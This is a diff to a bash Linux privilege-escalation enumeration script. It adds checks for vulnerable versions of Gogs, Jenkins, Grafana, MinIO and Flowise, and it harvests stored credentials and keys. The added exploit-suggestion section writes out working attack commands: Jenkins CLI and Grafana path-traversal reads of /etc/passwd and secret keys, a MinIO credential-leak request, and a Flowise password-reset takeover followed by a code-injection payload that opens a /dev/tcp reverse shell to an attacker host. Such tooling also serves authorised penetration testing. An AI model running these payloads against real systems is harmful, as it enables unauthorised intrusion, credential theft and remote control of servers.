@@ -44,6 +44,7 @@ fs="$main/FileSystem.txt"
 logs="$main/InterestingLogs.txt"
 devtools="$main/DevTools.txt"
 history="$main/Histories.txt"
+thirdparty="$main/ThirdPartyApps.txt"
 findings="$main/00-FINDINGS.txt"
 exploit="$main/01-ExploitPaths.txt"
 
@@ -60,7 +61,7 @@ banner() {
     echo "   ██║     ██║  ██║██║ ╚████╔╝    ██║"
     echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝"
     echo "  ============================================================================"
-    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.4${RST}"
+    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.5${RST}"
     echo -e "${CYN}  ============================================================================${RST}"
     echo ""
 }
@@ -731,8 +732,6 @@ if [ -n "$ssh_configs" ]; then
     echo "$ssh_configs" | while read -r sc; do
         run_cmd "$sc" "cat $sc" "$keys"
     done
-else
-    run_cmd "find ssh configs" "find /home /root -name 'config' -path '*/.ssh/*' 2>/dev/null" "$keys"
 fi
 
 sub_header ".htpasswd Files (web credentials)" "$keys"
@@ -1019,7 +1018,206 @@ echo -e "${GRN}    [✓] Saved → ${WHT}$devtools${RST}"
 echo ""
 
 # ============================================================================
-#  15. EXPLOIT PATH SUGGESTIONS
+#  15. THIRD-PARTY APPLICATION CVE CHECK
+# ============================================================================
+echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
+echo -e "${MAG}  PHASE 15: THIRD-PARTY APPLICATION CVE CHECK${RST}"
+echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
+
+section_header "Third-Party Application CVE Check" "$thirdparty"
+
+# version less-than: returns 0 if $1 < $2
+_ver_lt() {
+    [ "$1" = "$2" ] && return 1
+    [ "$(printf '%s\n' "$1" "$2" | sort -V | head -1)" = "$1" ]
+}
+
+_extract_ver() {
+    echo "$1" | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1
+}
+
+# Accumulate vulnerable app tags for exploit phase
+thirdparty_vulns=""
+
+# --- Gogs ---
+sub_header "Gogs (git server)" "$thirdparty"
+gogs_bin=$(find /opt/gogs /home /srv /usr/local -name 'gogs' -type f 2>/dev/null | head -1)
+gogs_ver=""
+if [ -n "$gogs_bin" ]; then
+    gogs_ver=$(_extract_ver "$($gogs_bin --version 2>/dev/null)")
+    echo "  [FOUND] Gogs: $gogs_bin  (v${gogs_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Gogs found: $gogs_bin (v${gogs_ver:-unknown})${RST}"
+    if [ -n "$gogs_ver" ]; then
+        if _ver_lt "$gogs_ver" "0.13.0"; then
+            finding "Gogs $gogs_ver — CVE-2024-39930/31/32/33: Multiple RCE/auth bypass/SSRF (< 0.13.0)" "$thirdparty"
+            thirdparty_vulns="${thirdparty_vulns}GOGS_RCE_2024:${gogs_ver}:${gogs_bin}\n"
+        fi
+        if _ver_lt "$gogs_ver" "0.12.6"; then
+            finding "Gogs $gogs_ver — CVE-2022-0415: Git hook RCE authenticated (< 0.12.6)" "$thirdparty"
+        fi
+        if _ver_lt "$gogs_ver" "0.11.66"; then
+            finding "Gogs $gogs_ver — CVE-2018-15192: SSRF (< 0.11.66)" "$thirdparty"
+        fi
+    fi
+    writable_hooks=$(find /opt/gogs /home /srv -path '*/repositories/*.git/hooks/*' -writable -type f 2>/dev/null | head -5)
+    if [ -n "$writable_hooks" ]; then
+        finding "Writable Gogs git hook(s) — inject commands, trigger on git push!" "$thirdparty"
+        echo "$writable_hooks" | while read -r h; do echo "       → $h" >> "$thirdparty"; done
+    fi
+    gogs_user=$(ps aux 2>/dev/null | grep '[g]ogs' | awk '{print $1}' | head -1)
+    if [ "$gogs_user" = "root" ]; then
+        finding "Gogs process runs as root — any code execution gives immediate root!" "$thirdparty"
+    else
+        echo "  Gogs runs as: ${gogs_user:-unknown}" >> "$thirdparty"
+    fi
+else
+    echo "  Gogs: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Gitea ---
+sub_header "Gitea (git server)" "$thirdparty"
+gitea_bin=$(find /opt/gitea /usr/local/bin /home /srv -name 'gitea' -type f 2>/dev/null | head -1)
+gitea_ver=""
+if [ -n "$gitea_bin" ]; then
+    gitea_ver=$(_extract_ver "$($gitea_bin --version 2>/dev/null)")
+    echo "  [FOUND] Gitea: $gitea_bin  (v${gitea_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Gitea found (v${gitea_ver:-unknown})${RST}"
+    if [ -n "$gitea_ver" ]; then
+        if _ver_lt "$gitea_ver" "1.22.0"; then
+            finding "Gitea $gitea_ver — CVE-2024-6886: CSRF/account takeover (< 1.22.0)" "$thirdparty"
+            thirdparty_vulns="${thirdparty_vulns}GITEA_CSRF:${gitea_ver}:${gitea_bin}\n"
+        fi
+        if _ver_lt "$gitea_ver" "1.16.5"; then
+            finding "Gitea $gitea_ver — CVE-2022-1058: Open redirect (< 1.16.5)" "$thirdparty"
+        fi
+    fi
+else
+    echo "  Gitea: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Jenkins ---
+sub_header "Jenkins (CI/CD)" "$thirdparty"
+jenkins_war=$(find /opt /usr/share /var/lib/jenkins -name 'jenkins.war' 2>/dev/null | head -1)
+jenkins_ver=""
+if [ -n "$jenkins_war" ] || pgrep -f 'jenkins' >/dev/null 2>&1; then
+    [ -z "$jenkins_war" ] && jenkins_war="(process only)"
+    jenkins_ver=$(_extract_ver "$(unzip -p "$jenkins_war" META-INF/MANIFEST.MF 2>/dev/null | grep -i 'Jenkins-Version\|Implementation-Version')")
+    echo "  [FOUND] Jenkins: $jenkins_war  (v${jenkins_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Jenkins found (v${jenkins_ver:-unknown})${RST}"
+    if [ -n "$jenkins_ver" ]; then
+        if _ver_lt "$jenkins_ver" "2.442"; then
+            finding "Jenkins $jenkins_ver — CVE-2024-23897: Unauthenticated file read via CLI (< 2.442)" "$thirdparty"
+            thirdparty_vulns="${thirdparty_vulns}JENKINS_CVE_2024_23897:${jenkins_ver}:jenkins\n"
+        fi
+        if _ver_lt "$jenkins_ver" "2.393"; then
+            finding "Jenkins $jenkins_ver — CVE-2023-27898: XSS to RCE (< 2.393)" "$thirdparty"
+        fi
+    fi
+    for jpath in /var/lib/jenkins /opt/jenkins ~/.jenkins; do
+        if [ -r "$jpath/credentials.xml" ]; then
+            finding "Jenkins credentials.xml readable: $jpath/credentials.xml" "$thirdparty"
+        fi
+        if [ -r "$jpath/secrets/master.key" ]; then
+            finding "Jenkins master.key readable: $jpath/secrets/master.key — can decrypt all stored credentials!" "$thirdparty"
+        fi
+    done
+else
+    echo "  Jenkins: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Grafana ---
+sub_header "Grafana (monitoring)" "$thirdparty"
+grafana_bin=$(which grafana-server 2>/dev/null || find /opt /usr/sbin /usr/share -name 'grafana-server' -type f 2>/dev/null | head -1)
+grafana_ver=""
+if [ -n "$grafana_bin" ]; then
+    grafana_ver=$(_extract_ver "$($grafana_bin --version 2>/dev/null)")
+    echo "  [FOUND] Grafana: $grafana_bin  (v${grafana_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Grafana found (v${grafana_ver:-unknown})${RST}"
+    if [ -n "$grafana_ver" ]; then
+        if ! _ver_lt "$grafana_ver" "8.0.0" && _ver_lt "$grafana_ver" "8.3.1"; then
+            finding "Grafana $grafana_ver — CVE-2021-43798: Unauthenticated path traversal/file read (8.0.0-8.3.0)!" "$thirdparty"
+            thirdparty_vulns="${thirdparty_vulns}GRAFANA_PATH_TRAV:${grafana_ver}:${grafana_bin}\n"
+        fi
+    fi
+    for gconf in /etc/grafana/grafana.ini /usr/share/grafana/conf/defaults.ini; do
+        if [ -r "$gconf" ]; then
+            gf_secret=$(grep -E '^\s*(secret_key|admin_password)\s*=' "$gconf" 2>/dev/null | grep -v '^\s*;')
+            if [ -n "$gf_secret" ]; then
+                finding "Grafana config contains credentials: $gconf" "$thirdparty"
+                echo "$gf_secret" | while read -r gl; do echo "       → $gl" >> "$thirdparty"; done
+            fi
+        fi
+    done
+else
+    echo "  Grafana: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- MinIO ---
+sub_header "MinIO (object storage)" "$thirdparty"
+minio_bin=$(which minio 2>/dev/null || find /opt /usr/local/bin -name 'minio' -type f 2>/dev/null | head -1)
+if [ -n "$minio_bin" ]; then
+    minio_ver=$(_extract_ver "$($minio_bin --version 2>/dev/null)")
+    echo "  [FOUND] MinIO: $minio_bin  (v${minio_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] MinIO found (v${minio_ver:-unknown})${RST}"
+    minio_creds=$(ps auxww 2>/dev/null | grep '[m]inio' | grep -oE 'MINIO_(ROOT|ACCESS)_(USER|KEY|PASSWORD)=[^ ]+')
+    if [ -n "$minio_creds" ]; then
+        finding "MinIO credentials visible in process arguments!" "$thirdparty"
+        echo "$minio_creds" | while read -r mc; do echo "       → $mc" >> "$thirdparty"; done
+    fi
+    finding "MinIO detected — check CVE-2023-28432: POST /minio/health/cluster?verify leaks env vars (unauthenticated, RELEASE.2023-03-13 and earlier)" "$thirdparty"
+    thirdparty_vulns="${thirdparty_vulns}MINIO_INFO_LEAK:${minio_ver:-unknown}:${minio_bin}\n"
+else
+    echo "  MinIO: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Flowise ---
+sub_header "Flowise (LLM workflow)" "$thirdparty"
+flowise_pkg=$(find /opt /home /srv /usr/local -name 'package.json' -path '*flowise*' 2>/dev/null | head -1)
+flowise_ver=""
+if [ -n "$flowise_pkg" ] || pgrep -f 'flowise' >/dev/null 2>&1; then
+    if [ -n "$flowise_pkg" ] && [ -r "$flowise_pkg" ]; then
+        flowise_ver=$(_extract_ver "$(grep -o '"version":"[^"]*"' "$flowise_pkg" 2>/dev/null)")
+    fi
+    echo "  [FOUND] Flowise: ${flowise_pkg:-running process}  (v${flowise_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Flowise found (v${flowise_ver:-unknown})${RST}"
+    if [ -z "$flowise_ver" ] || _ver_lt "$flowise_ver" "3.0.6"; then
+        finding "Flowise ${flowise_ver:-unknown} — CVE-2025-59528: Authenticated RCE via CustomMCP node (< 3.0.6)" "$thirdparty"
+        finding "Flowise ${flowise_ver:-unknown} — CVE-2025-58434: Unauthenticated password reset token disclosure (< 3.0.6)" "$thirdparty"
+        thirdparty_vulns="${thirdparty_vulns}FLOWISE_RCE:${flowise_ver:-unknown}:flowise\n"
+    fi
+else
+    echo "  Flowise: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Generic /opt scan ---
+sub_header "Unknown apps in /opt /srv" "$thirdparty"
+run_cmd "ls /opt" "ls -la /opt/ 2>/dev/null" "$thirdparty"
+run_cmd "ls /srv" "ls -la /srv/ 2>/dev/null" "$thirdparty"
+for appdir in /opt/*/; do
+    appname=$(basename "$appdir")
+    case "$appname" in
+        gogs|gitea|jenkins|grafana|minio|flowise|lampp) continue ;;
+    esac
+    [ -d "$appdir" ] || continue
+    echo "  [APP] $appdir — enumerate manually (version/CVEs unknown)" >> "$thirdparty"
+    echo -e "    ${YLW}[?] Unknown /opt app: $appdir${RST}"
+    for vfile in "${appdir}VERSION" "${appdir}version.txt" "${appdir}package.json"; do
+        [ -r "$vfile" ] && echo "      → $vfile: $(head -3 "$vfile" 2>/dev/null)" >> "$thirdparty"
+    done
+done
+
+separator "$thirdparty"
+echo -e "${GRN}    [✓] Saved → ${WHT}$thirdparty${RST}"
+echo ""
+
+# ============================================================================
+#  16. EXPLOIT PATH SUGGESTIONS
 # ============================================================================
 echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
 echo -e "${MAG}  PHASE 15: EXPLOIT PATH SUGGESTIONS${RST}"
@@ -1447,6 +1645,56 @@ if [ -w /etc/ld.so.conf ] || [ -n "$(find /etc/ld.so.conf.d/ -writable -type f 2
   Next time a privileged binary loads that library name, your code runs."
 fi
 
+# ── P1/P2: Third-party application CVEs ───────────────────────────────────
+if printf '%b' "$thirdparty_vulns" | grep -q "GOGS_RCE_2024"; then
+    gogs_v=$(printf '%b' "$thirdparty_vulns" | grep "GOGS_RCE_2024" | cut -d: -f2 | head -1)
+    exploit_entry "P1" "Gogs $gogs_v — CVE-2024-39930/31/32/33 (multiple RCE < 0.13.0)" \
+"  Chained: argument injection in git fetch + SSRF + auth bypass → unauthenticated RCE.
+  \$ searchsploit gogs
+  PoC: https://github.com/search?q=CVE-2024-39930&type=repositories
+  Also check writable git hooks in /opt/gogs/repositories/ for authenticated path."
+fi
+
+if printf '%b' "$thirdparty_vulns" | grep -q "JENKINS_CVE_2024_23897"; then
+    jenkins_v=$(printf '%b' "$thirdparty_vulns" | grep "JENKINS_CVE_2024_23897" | cut -d: -f2 | head -1)
+    exploit_entry "P1" "Jenkins $jenkins_v — CVE-2024-23897: Unauthenticated file read via CLI" \
+"  Read arbitrary files including secrets/master.key:
+  \$ curl -s http://localhost:8080/jnlpJars/jenkins-cli.jar -o /tmp/jenkins-cli.jar
+  \$ java -jar /tmp/jenkins-cli.jar -s http://localhost:8080/ who-am-i '@/etc/passwd'
+  \$ java -jar /tmp/jenkins-cli.jar -s http://localhost:8080/ who-am-i '@/var/lib/jenkins/secrets/master.key'
+  Decrypt stored creds: https://github.com/hoto/jenkins-credentials-decryptor
+  PoC: https://github.com/CKevens/CVE-2024-23897"
+fi
+
+if printf '%b' "$thirdparty_vulns" | grep -q "GRAFANA_PATH_TRAV"; then
+    grafana_v=$(printf '%b' "$thirdparty_vulns" | grep "GRAFANA_PATH_TRAV" | cut -d: -f2 | head -1)
+    exploit_entry "P1" "Grafana $grafana_v — CVE-2021-43798: Unauthenticated path traversal" \
+"  Read any file via plugin endpoint (no auth):
+  \$ curl -s 'http://localhost:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd'
+  Read Grafana admin creds:
+  \$ curl -s 'http://localhost:3000/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini'
+  PoC: https://github.com/jas502n/Grafana-CVE-2021-43798"
+fi
+
+if printf '%b' "$thirdparty_vulns" | grep -q "MINIO_INFO_LEAK"; then
+    exploit_entry "P2" "MinIO — CVE-2023-28432: Unauthenticated env var disclosure" \
+"  POST to health endpoint leaks MINIO_ROOT_USER and MINIO_ROOT_PASSWORD:
+  \$ curl -s -X POST http://localhost:9000/minio/health/cluster?verify
+  Use returned creds to access MinIO console or piviot to other services."
+fi
+
+if printf '%b' "$thirdparty_vulns" | grep -q "FLOWISE_RCE"; then
+    flowise_v=$(printf '%b' "$thirdparty_vulns" | grep "FLOWISE_RCE" | cut -d: -f2 | head -1)
+    exploit_entry "P1" "Flowise $flowise_v — CVE-2025-59528: Authenticated RCE via CustomMCP node" \
+"  Step 1 — get token (CVE-2025-58434 unauthenticated reset leak if needed):
+  \$ curl -X POST http://target/api/v1/account/forgot-password -H 'Content-Type: application/json' -d '{\"email\":\"admin@target\"}'
+  Token returned in response — use /api/v1/account/reset-password to set new password.
+  Step 2 — RCE with valid API key:
+  \$ curl -X POST http://target/api/v1/node-load-method/customMCP \\
+    -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' \\
+    -d '{\"inputs\":{\"mcpServerConfig\":\"({x:(function(){const cp=process.mainModule.require(\\\"child_process\\\");cp.exec(\\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\");return 1;})()})\"}}'"
+fi
+
 # ── Finalise — count entries directly from the file ───────────────────────
 exploit_count=$(grep -c '^\[P' "$exploit" 2>/dev/null || echo 0)
 {
@@ -1504,7 +1752,7 @@ echo -e "  ${GRN}Files Generated:${RST}"
 echo -e "  ─────────────────────────────────────────"
 
 for f in "$findings" "$exploit" "$sys" "$ugo" "$pswd" "$shdw" "$svc" "$cronned" "$path_info" \
-         "$netstuff" "$suid" "$keys" "$sql" "$logs" "$fs" "$history" "$devtools"; do
+         "$netstuff" "$suid" "$keys" "$sql" "$logs" "$fs" "$history" "$devtools" "$thirdparty"; do
     if [ -f "$f" ]; then
         size=$(du -h "$f" 2>/dev/null | cut -f1)
         echo -e "    ${GRN}✓${RST} ${f##*/}  ${YLW}(${size})${RST}"
